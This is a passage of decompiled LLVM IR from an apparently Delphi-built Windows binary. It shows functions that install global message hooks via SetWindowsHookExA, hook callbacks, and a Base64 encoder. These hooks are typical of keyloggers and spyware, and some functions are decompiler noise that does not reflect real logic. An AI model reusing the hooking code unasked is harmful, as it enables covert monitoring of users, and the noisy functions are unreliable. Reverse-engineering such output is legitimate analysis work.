  br label %dec_label_pc_40576c, !insn.addr !895

dec_label_pc_40576c:                              ; preds = %dec_label_pc_405767, %dec_label_pc_405744, %dec_label_pc_405708
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %15 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !896
  %16 = load i32, i32* %15, align 4, !insn.addr !896
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !897
  %17 = add i32 %esp.0.reload, 8, !insn.addr !898
  %18 = inttoptr i32 %17 to i32*, !insn.addr !898
  store i32 4216713, i32* %18, align 4, !insn.addr !898
  %19 = call i32 @"@LStrClr"(), !insn.addr !899
  ret i32 %19, !insn.addr !900
}

define i32 @function_405782() local_unnamed_addr {
dec_label_pc_405782:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !901
  ret i32 %0, !insn.addr !901
}

define i32 @function_405787() local_unnamed_addr {
dec_label_pc_405787:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !902
}

define i32 @function_405789(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405789:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !903
}

define i32 @function_40578d() local_unnamed_addr {
dec_label_pc_40578d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = bitcast i32* %eax to i8*
  %6 = trunc i32 %4 to i8
  %7 = mul i8 %6, 2, !insn.addr !904
  %8 = inttoptr i32 %4 to i8*, !insn.addr !904
  store i8 %7, i8* %8, align 1, !insn.addr !904
  %9 = add i32 %2, 111, !insn.addr !905
  %10 = inttoptr i32 %9 to i8*, !insn.addr !905
  %11 = load i8, i8* %10, align 1, !insn.addr !905
  %12 = load i32, i32* %eax, align 4, !insn.addr !905
  %13 = trunc i32 %12 to i8, !insn.addr !905
  %14 = add i8 %11, %13, !insn.addr !905
  store i8 %14, i8* %10, align 1, !insn.addr !905
  %15 = trunc i32 %3 to i16, !insn.addr !906
  %16 = call i32 @__asm_insd(i16 %15), !insn.addr !906
  %17 = inttoptr i32 %0 to i32*, !insn.addr !906
  store i32 %16, i32* %17, align 4, !insn.addr !906
  %18 = add i32 %0, 66, !insn.addr !907
  %19 = inttoptr i32 %18 to i64*, !insn.addr !907
  %20 = load i64, i64* %19, align 4, !insn.addr !907
  %21 = call i32 @__asm_bound(i64 %20), !insn.addr !907
  call void @__asm_outsd(i16 %15, i32 %1), !insn.addr !908
  %22 = load i8, i8* %5, align 4, !insn.addr !909
  %23 = load i32, i32* %eax, align 4
  %24 = trunc i32 %23 to i8, !insn.addr !909
  %25 = add i8 %22, %24, !insn.addr !909
  %26 = inttoptr i32 %23 to i8*, !insn.addr !909
  store i8 %25, i8* %26, align 1, !insn.addr !909
  %27 = add i32 %21, -117, !insn.addr !910
  %28 = inttoptr i32 %27 to i8*, !insn.addr !910
  %29 = load i8, i8* %28, align 1, !insn.addr !910
  %30 = trunc i32 %3 to i8, !insn.addr !910
  %31 = add i8 %29, %30, !insn.addr !910
  store i8 %31, i8* %28, align 1, !insn.addr !910
  %32 = call i8 @__asm_in(i16 %15), !insn.addr !911
  %33 = add i32 %21, 16, !insn.addr !912
  %34 = inttoptr i32 %33 to i32*, !insn.addr !912
  %35 = load i32, i32* %34, align 4, !insn.addr !912
  %36 = add i32 %21, 12, !insn.addr !913
  %37 = inttoptr i32 %36 to i32*, !insn.addr !913
  %38 = load i32, i32* %37, align 4, !insn.addr !913
  %39 = add i32 %21, 8, !insn.addr !914
  %40 = inttoptr i32 %39 to i32*, !insn.addr !914
  %41 = load i32, i32* %40, align 4, !insn.addr !914
  %42 = load i32, i32* inttoptr (i32 4227372 to i32*), align 4, !insn.addr !915
  %43 = inttoptr i32 %42 to i32*, !insn.addr !916
  %44 = load i32, i32* %43, align 4, !insn.addr !916
  %45 = icmp eq i32 %44, 0, !insn.addr !916
  %46 = icmp eq i1 %45, false, !insn.addr !917
  %47 = icmp eq i32 %41, 0, !insn.addr !918
  %48 = icmp eq i1 %47, %46
  %49 = icmp eq i32 %38, 1, !insn.addr !919
  %50 = icmp eq i1 %49, %48
  br i1 %50, label %dec_label_pc_4057c3, label %dec_label_pc_4057f2, !insn.addr !920

dec_label_pc_4057c3:                              ; preds = %dec_label_pc_40578d
  store i32 %35, i32* %eax, align 4, !insn.addr !921
  %51 = add i32 %35, 4, !insn.addr !922
  %52 = inttoptr i32 %51 to i32*, !insn.addr !922
  %53 = load i32, i32* %52, align 4, !insn.addr !922
  switch i32 %53, label %dec_label_pc_4057f2 [
    i32 256, label %dec_label_pc_4057da
    i32 770, label %dec_label_pc_4057eb
  ]

dec_label_pc_4057da:                              ; preds = %dec_label_pc_4057c3
  %54 = call i32 @function_405518(i32 %2, i32 %1, i32 %0), !insn.addr !923
  br label %dec_label_pc_4057f2, !insn.addr !924

dec_label_pc_4057eb:                              ; preds = %dec_label_pc_4057c3
  %55 = call i32 @function_40563c(i32 %2, i32 %1, i32 %0), !insn.addr !925
  br label %dec_label_pc_4057f2, !insn.addr !925

dec_label_pc_4057f2:                              ; preds = %dec_label_pc_40578d, %dec_label_pc_4057c3, %dec_label_pc_4057eb, %dec_label_pc_4057da
  %56 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !926
  %57 = inttoptr i32 %35 to i32*, !insn.addr !927
  %58 = call i32 @CallNextHookEx(i32* %57, i32 %38, i32 %41, i32 %56), !insn.addr !927
  ret i32 %58, !insn.addr !928
}

define i32 @function_405808(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405808:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = load i32, i32* @global_var_40812c, align 4
  %4 = icmp eq i32 %3, 0, !insn.addr !929
  %5 = icmp eq i1 %4, false, !insn.addr !930
  %6 = icmp eq i32 %arg3, 0, !insn.addr !931
  %7 = icmp eq i1 %6, %5
  br i1 %7, label %dec_label_pc_405826, label %dec_label_pc_405838, !insn.addr !932

dec_label_pc_405826:                              ; preds = %dec_label_pc_405808
  %8 = add i32 %arg1, 8, !insn.addr !933
  %9 = inttoptr i32 %8 to i32*, !insn.addr !933
  %10 = load i32, i32* %9, align 4, !insn.addr !933
  %11 = icmp eq i32 %10, 2, !insn.addr !934
  %12 = icmp eq i1 %11, false, !insn.addr !935
  br i1 %12, label %dec_label_pc_405838, label %dec_label_pc_405830, !insn.addr !935

dec_label_pc_405830:                              ; preds = %dec_label_pc_405826
  %13 = call i32 @function_405708(i32 %1, i32 %2, i32 %0), !insn.addr !936
  br label %dec_label_pc_405838, !insn.addr !936

dec_label_pc_405838:                              ; preds = %dec_label_pc_405808, %dec_label_pc_405830, %dec_label_pc_405826
  %14 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !937
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !938
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !938
  ret i32 %16, !insn.addr !939
}

define i32 @function_405850() local_unnamed_addr {
dec_label_pc_405850:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4216732 to i32*), i32 3), !insn.addr !940
  %2 = ptrtoint i32* %1 to i32, !insn.addr !940
  store i32 %2, i32* @global_var_4096b8, align 4, !insn.addr !941
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4216840 to i32*), i32 4), !insn.addr !942
  %5 = ptrtoint i32* %4 to i32, !insn.addr !942
  store i32 %5, i32* @global_var_4096bc, align 4, !insn.addr !943
  ret i32 %5, !insn.addr !944
}

define i32 @function_405888() local_unnamed_addr {
dec_label_pc_405888:
  %0 = load i32, i32* @global_var_4096b8, align 4, !insn.addr !945
  %1 = inttoptr i32 %0 to i32*, !insn.addr !946
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !946
  %3 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !947
  %4 = inttoptr i32 %3 to i32*, !insn.addr !948
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !948
  %6 = sext i1 %5 to i32, !insn.addr !948
  ret i32 %6, !insn.addr !949
}

define i32 @function_4058a0() local_unnamed_addr {
dec_label_pc_4058a0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !950
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !950
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !950
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !951
  %2 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !952
  %3 = add i32 %2, 1, !insn.addr !952
  store i32 %3, i32* @global_var_4096b4, align 4, !insn.addr !952
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !953
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !954
  ret i32 0, !insn.addr !955
}

define i32 @function_4058c5() local_unnamed_addr {
dec_label_pc_4058c5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !956
  ret i32 %0, !insn.addr !956
}

define i32 @function_4058ca() local_unnamed_addr {
dec_label_pc_4058ca:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !957
}

define i32 @function_4058cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4058cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !958
}

define i32 @function_4058d0() local_unnamed_addr {
dec_label_pc_4058d0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !959
  %2 = add i32 %1, -1, !insn.addr !959
  store i32 %2, i32* @global_var_4096b4, align 4, !insn.addr !959
  ret i32 %0, !insn.addr !960
}

define i32 @function_4058db(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4058db:
  %storemerge.reg2mem = alloca i32, !insn.addr !961
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !961
  %5 = inttoptr i32 %3 to i32*, !insn.addr !961
  store i32 %4, i32* %5, align 4, !insn.addr !961
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !962
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !962
  %10 = add i8 %7, %9, !insn.addr !962
  %11 = inttoptr i32 %8 to i8*, !insn.addr !962
  store i8 %10, i8* %11, align 1, !insn.addr !962
  %12 = load i32, i32* %eax, align 4, !insn.addr !963
  store i32 %arg1, i32* %eax, align 4, !insn.addr !964
  %13 = add i32 %12, 99, !insn.addr !965
  %14 = inttoptr i32 %13 to i64*, !insn.addr !965
  %15 = load i64, i64* %14, align 4, !insn.addr !965
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !965
  %17 = add i32 %16, -2, !insn.addr !966
  %18 = inttoptr i32 %17 to i16*, !insn.addr !966
  store i16 27241, i16* %18, align 2, !insn.addr !966
  %19 = mul i32 %2, 2, !insn.addr !967
  %20 = add i32 %2, 110, !insn.addr !967
  %21 = add i32 %20, %19, !insn.addr !967
  %22 = inttoptr i32 %21 to i32*, !insn.addr !967
  %23 = load i32, i32* %22, align 4, !insn.addr !967
  %24 = sext i32 %23 to i64, !insn.addr !967
  %25 = mul nsw i64 %24, 111, !insn.addr !967
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !967
  %28 = icmp eq i64 %25, %27, !insn.addr !967
  br i1 %28, label %dec_label_pc_40590d, label %dec_label_pc_40597c, !insn.addr !968

dec_label_pc_40590d:                              ; preds = %dec_label_pc_4058db
  %29 = icmp eq i32 %0, 0, !insn.addr !969
  br i1 %29, label %dec_label_pc_405984, label %dec_label_pc_405911, !insn.addr !970

dec_label_pc_405911:                              ; preds = %dec_label_pc_40590d
  %30 = icmp slt i32 %0, 0, !insn.addr !969
  br i1 %30, label %dec_label_pc_40598c, label %dec_label_pc_405913, !insn.addr !971

dec_label_pc_405913:                              ; preds = %dec_label_pc_405911
  %31 = trunc i32 %0 to i8, !insn.addr !969
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !716, !insn.addr !969
  %33 = and i8 %32, 1, !insn.addr !969
  %34 = icmp eq i8 %33, 0, !insn.addr !969
  br i1 %34, label %dec_label_pc_405945, label %dec_label_pc_405915, !insn.addr !972

dec_label_pc_405915:                              ; preds = %dec_label_pc_405913
  %35 = add i32 %12, -1, !insn.addr !963
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !973
  %37 = load i32, i32* %36, align 4, !insn.addr !973
  %38 = xor i32 %37, %1, !insn.addr !973
  store i32 %38, i32* %36, align 4, !insn.addr !973
  %39 = add i32 %1, 959985462, !insn.addr !974
  %40 = inttoptr i32 %39 to i32*, !insn.addr !974
  %41 = load i32, i32* %40, align 4, !insn.addr !974
  %42 = xor i32 %41, %1, !insn.addr !974
  %43 = add i32 %16, -38, !insn.addr !975
  %44 = inttoptr i32 %43 to i32*, !insn.addr !975
  store i32 %35, i32* %44, align 4, !insn.addr !975
  %45 = add i32 %16, -42, !insn.addr !976
  %46 = inttoptr i32 %45 to i32*, !insn.addr !976
  store i32 %42, i32* %46, align 4, !insn.addr !976
  %47 = add i32 %16, -22, !insn.addr !977
  %48 = inttoptr i32 %47 to i32*, !insn.addr !977
  store i32 0, i32* %48, align 4, !insn.addr !977
  %49 = add i32 %16, -26, !insn.addr !978
  %50 = inttoptr i32 %49 to i32*, !insn.addr !978
  store i32 0, i32* %50, align 4, !insn.addr !978
  %51 = add i32 %16, -30, !insn.addr !979
  %52 = inttoptr i32 %51 to i32*, !insn.addr !979
  store i32 0, i32* %52, align 4, !insn.addr !979
  %53 = add i32 %16, -34, !insn.addr !980
  %54 = inttoptr i32 %53 to i32*, !insn.addr !980
  store i32 0, i32* %54, align 4, !insn.addr !980
  %55 = add i32 %16, -6, !insn.addr !981
  %56 = inttoptr i32 %55 to i32*, !insn.addr !981
  store i32 %arg3, i32* %56, align 4, !insn.addr !981
  %57 = add i32 %16, -46, !insn.addr !982
  %58 = inttoptr i32 %57 to i32*, !insn.addr !982
  store i32 %17, i32* %58, align 4, !insn.addr !982
  ret i32 0, !insn.addr !982

dec_label_pc_405945:                              ; preds = %dec_label_pc_405913
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !983
  %60 = trunc i64 %25 to i32, !insn.addr !967
  %61 = load i32, i32* %eax, align 4, !insn.addr !984
  %62 = add i32 %61, 1, !insn.addr !984
  %63 = mul i32 %59, 8, !insn.addr !985
  %64 = add i32 %59, 48, !insn.addr !985
  %65 = add i32 %64, %63, !insn.addr !985
  %66 = inttoptr i32 %65 to i8*, !insn.addr !985
  %67 = load i8, i8* %66, align 4, !insn.addr !985
  %68 = udiv i32 %62, 256, !insn.addr !985
  %69 = trunc i32 %68 to i8, !insn.addr !985
  %70 = add i8 %67, %69, !insn.addr !985
  store i8 %70, i8* %66, align 4, !insn.addr !985
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !986
  %71 = call i32 @"@LStrClr"(), !insn.addr !987
  %72 = call i32 @function_4034f4(), !insn.addr !988
  %73 = add i32 %60, -8, !insn.addr !989
  %74 = inttoptr i32 %73 to i32*, !insn.addr !989
  store i32 %72, i32* %74, align 4, !insn.addr !989
  %75 = ashr i32 %72, 31, !insn.addr !990
  %76 = zext i32 %72 to i64, !insn.addr !991
  %77 = zext i32 %75 to i64, !insn.addr !991
  %78 = mul i64 %77, 4294967296, !insn.addr !991
  %79 = or i64 %78, %76, !insn.addr !991
  %80 = sdiv i64 %79, 3, !insn.addr !991
  %81 = trunc i64 %80 to i32, !insn.addr !991
  store i32 %81, i32* %eax, align 4, !insn.addr !991
  %82 = srem i64 %79, 3, !insn.addr !991
  %83 = trunc i64 %82 to i32, !insn.addr !991
  %84 = icmp eq i32 %83, 0, !insn.addr !992
  %85 = icmp eq i1 %84, false, !insn.addr !993
  br i1 %85, label %dec_label_pc_40597b, label %dec_label_pc_40596e, !insn.addr !993

dec_label_pc_40596e:                              ; preds = %dec_label_pc_405945
  %86 = load i32, i32* %74, align 4, !insn.addr !994
  %87 = ashr i32 %86, 31, !insn.addr !995
  %88 = zext i32 %86 to i64, !insn.addr !996
  %89 = zext i32 %87 to i64, !insn.addr !996
  %90 = mul i64 %89, 4294967296, !insn.addr !996
  %91 = or i64 %90, %88, !insn.addr !996
  %92 = sdiv i64 %91, 3, !insn.addr !996
  %93 = trunc i64 %92 to i32, !insn.addr !996
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !997
  br label %dec_label_pc_405988, !insn.addr !997

dec_label_pc_40597b:                              ; preds = %dec_label_pc_405945
  ret i32 %81, !insn.addr !997

dec_label_pc_40597c:                              ; preds = %dec_label_pc_4058db
  %94 = load i32, i32* %eax, align 4, !insn.addr !998
  ret i32 %94, !insn.addr !998

dec_label_pc_405984:                              ; preds = %dec_label_pc_40590d
  %95 = load i32, i32* %eax, align 4, !insn.addr !999
  %96 = zext i32 %95 to i64, !insn.addr !999
  %97 = zext i32 %arg3 to i64, !insn.addr !999
  %98 = mul i64 %97, 4294967296, !insn.addr !999
  %99 = or i64 %98, %96, !insn.addr !999
  %100 = zext i32 %arg2 to i64, !insn.addr !999
  %101 = sdiv i64 %99, %100, !insn.addr !999
  %102 = trunc i64 %101 to i32, !insn.addr !999
  %103 = add i32 %102, 1, !insn.addr !1000
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !1000
  br label %dec_label_pc_405988, !insn.addr !1000

dec_label_pc_405988:                              ; preds = %dec_label_pc_40596e, %dec_label_pc_405984
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !1001
  ret i32 %104, !insn.addr !1002

dec_label_pc_40598c:                              ; preds = %dec_label_pc_405911
  %105 = inttoptr i32 %1 to i32*, !insn.addr !1003
  %106 = load i32, i32* %105, align 4, !insn.addr !1003
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !1003
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !1004
  %109 = load i32, i32* %108, align 4, !insn.addr !1004
  %110 = add i32 %109, %107, !insn.addr !1004
  store i32 %110, i32* %108, align 4, !insn.addr !1004
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !1005
  %113 = inttoptr i32 %112 to i8*, !insn.addr !1005
  %114 = load i8, i8* %113, align 1, !insn.addr !1005
  %115 = trunc i32 %111 to i8, !insn.addr !1005
  %116 = add i8 %114, %115, !insn.addr !1005
  store i8 %116, i8* %113, align 1, !insn.addr !1005
  %117 = load i32, i32* %eax, align 4, !insn.addr !1006
  ret i32 %117, !insn.addr !1006
}

define i32 @function_405994() local_unnamed_addr {
dec_label_pc_405994:
  %ebx.0.reg2mem = alloca i32, !insn.addr !1007
  %esp.0.reg2mem = alloca i32, !insn.addr !1007
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !1008
  %3 = inttoptr i32 %2 to i32*, !insn.addr !1008
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !1009
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1009
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1007
  br label %dec_label_pc_405996, !insn.addr !1007

dec_label_pc_405996:                              ; preds = %dec_label_pc_405ae1, %dec_label_pc_405994
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !1010
  %25 = add i32 %24, 3, !insn.addr !1011
  %26 = load i32, i32* %3, align 4, !insn.addr !1008
  %27 = icmp sgt i32 %25, %26, !insn.addr !1012
  br i1 %27, label %dec_label_pc_405a36, label %dec_label_pc_4059a7, !insn.addr !1012

dec_label_pc_4059a7:                              ; preds = %dec_label_pc_405996
  %28 = add i32 %24, %0, !insn.addr !1013
  %29 = inttoptr i32 %28 to i8*, !insn.addr !1013
  %30 = load i8, i8* %29, align 1, !insn.addr !1013
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !1014
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !1015
  %34 = inttoptr i32 %33 to i8*, !insn.addr !1015
  %35 = load i8, i8* %34, align 1, !insn.addr !1015
  store i8 %35, i8* %5, align 1, !insn.addr !1016
  %36 = load i8, i8* %29, align 1, !insn.addr !1017
  %37 = mul i8 %36, 16, !insn.addr !1018
  %38 = and i8 %37, 48, !insn.addr !1019
  %39 = add i32 %28, 1, !insn.addr !1020
  %40 = inttoptr i32 %39 to i8*, !insn.addr !1020
  %41 = load i8, i8* %40, align 1, !insn.addr !1020
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !1021
  %44 = zext i8 %43 to i32, !insn.addr !1021
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !1022
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1022
  %47 = load i8, i8* %46, align 1, !insn.addr !1022
  store i8 %47, i8* %7, align 1, !insn.addr !1023
  %48 = load i8, i8* %40, align 1, !insn.addr !1024
  %49 = mul i8 %48, 4, !insn.addr !1025
  %50 = and i8 %49, 60, !insn.addr !1026
  %51 = add i32 %28, 2, !insn.addr !1027
  %52 = inttoptr i32 %51 to i8*, !insn.addr !1027
  %53 = load i8, i8* %52, align 1, !insn.addr !1027
  %54 = udiv i8 %53, 64, !insn.addr !1028
  %55 = or i8 %54, %50, !insn.addr !1029
  %56 = zext i8 %55 to i32, !insn.addr !1029
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !1030
  %58 = inttoptr i32 %57 to i8*, !insn.addr !1030
  %59 = load i8, i8* %58, align 1, !insn.addr !1030
  store i8 %59, i8* %9, align 1, !insn.addr !1031
  %60 = and i8 %53, 63, !insn.addr !1032
  %61 = zext i8 %60 to i32, !insn.addr !1032
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !1033
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1033
  %64 = load i8, i8* %63, align 1, !insn.addr !1033
  store i8 %64, i8* %11, align 1, !insn.addr !1034
  br label %dec_label_pc_405ae1, !insn.addr !1035

dec_label_pc_405a36:                              ; preds = %dec_label_pc_405996
  %65 = add i32 %24, 2, !insn.addr !1036
  %66 = icmp sgt i32 %65, %26, !insn.addr !1037
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_405aa5, label %dec_label_pc_405a40, !insn.addr !1037

dec_label_pc_405a40:                              ; preds = %dec_label_pc_405a36
  %76 = mul i8 %75, 16, !insn.addr !1038
  %77 = and i8 %76, 48, !insn.addr !1039
  %78 = add i32 %67, 1, !insn.addr !1040
  %79 = inttoptr i32 %78 to i8*, !insn.addr !1040
  %80 = load i8, i8* %79, align 1, !insn.addr !1040
  %81 = zext i8 %80 to i32, !insn.addr !1040
  %82 = udiv i8 %80, 16, !insn.addr !1041
  %83 = or i8 %82, %77, !insn.addr !1042
  %84 = zext i8 %83 to i32, !insn.addr !1042
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !1043
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1043
  %87 = load i8, i8* %86, align 1, !insn.addr !1043
  store i8 %87, i8* %7, align 1, !insn.addr !1044
  %88 = mul i32 %81, 4, !insn.addr !1045
  %89 = and i32 %88, 60, !insn.addr !1046
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !1047
  %91 = inttoptr i32 %90 to i8*, !insn.addr !1047
  %92 = load i8, i8* %91, align 4, !insn.addr !1047
  store i8 %92, i8* %9, align 1, !insn.addr !1048
  store i8 61, i8* %11, align 1, !insn.addr !1049
  br label %dec_label_pc_405ae1, !insn.addr !1050

dec_label_pc_405aa5:                              ; preds = %dec_label_pc_405a36
  %93 = zext i8 %75 to i32, !insn.addr !1051
  %94 = mul i32 %93, 16, !insn.addr !1052
  %95 = and i32 %94, 48, !insn.addr !1053
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_4058e0 to i32), !insn.addr !1054
  %97 = inttoptr i32 %96 to i8*, !insn.addr !1054
  %98 = load i8, i8* %97, align 16, !insn.addr !1054
  store i8 %98, i8* %7, align 1, !insn.addr !1055
  store i8 61, i8* %9, align 1, !insn.addr !1056
  store i8 61, i8* %11, align 1, !insn.addr !1057
  br label %dec_label_pc_405ae1, !insn.addr !1057

dec_label_pc_405ae1:                              ; preds = %dec_label_pc_405aa5, %dec_label_pc_405a40, %dec_label_pc_4059a7
  %99 = load i32, i32* %13, align 4, !insn.addr !1009
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1058
  %101 = load i32, i32* %100, align 4, !insn.addr !1058
  %102 = add i32 %esp.0.reload, -4, !insn.addr !1058
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1058
  store i32 %101, i32* %103, align 4, !insn.addr !1058
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !1059
  %105 = load i32, i32* %15, align 4, !insn.addr !1060
  %106 = add i32 %esp.0.reload, -8, !insn.addr !1060
  %107 = inttoptr i32 %106 to i32*, !insn.addr !1060
  store i32 %105, i32* %107, align 4, !insn.addr !1060
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !1061
  %109 = load i32, i32* %17, align 4, !insn.addr !1062
  %110 = add i32 %esp.0.reload, -12, !insn.addr !1062
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !1062
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !1063
  %113 = load i32, i32* %19, align 4, !insn.addr !1064
  %114 = add i32 %esp.0.reload, -16, !insn.addr !1064
  %115 = inttoptr i32 %114 to i32*, !insn.addr !1064
  store i32 %113, i32* %115, align 4, !insn.addr !1064
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !1065
  %117 = load i32, i32* %21, align 4, !insn.addr !1066
  %118 = add i32 %esp.0.reload, -20, !insn.addr !1066
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !1066
  %120 = call i32 @"@LStrCatN"(), !insn.addr !1067
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !1068
  %122 = load i32, i32* %23, align 4, !insn.addr !1069
  %123 = add i32 %122, -1, !insn.addr !1069
  %124 = icmp eq i32 %123, 0, !insn.addr !1069
  store i32 %123, i32* %23, align 4, !insn.addr !1069
  %125 = icmp eq i1 %124, false, !insn.addr !1070
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !1070
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !1070
  br i1 %125, label %dec_label_pc_405996, label %dec_label_pc_405b35, !insn.addr !1070

dec_label_pc_405b35:                              ; preds = %dec_label_pc_405ae1
  %126 = load i32, i32* %119, align 4, !insn.addr !1071
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !1072
  store i32 4217687, i32* %111, align 4, !insn.addr !1073
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !1074
  ret i32 %127, !insn.addr !1075
}

define i32 @function_405b50() local_unnamed_addr {
dec_label_pc_405b50:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1076
  ret i32 %0, !insn.addr !1076
}

define i32 @function_405b55() local_unnamed_addr {
dec_label_pc_405b55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1077
}

define i32 @function_405b57(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_405b57:
  %0 = call i32 @__decompiler_undefined_function_0()
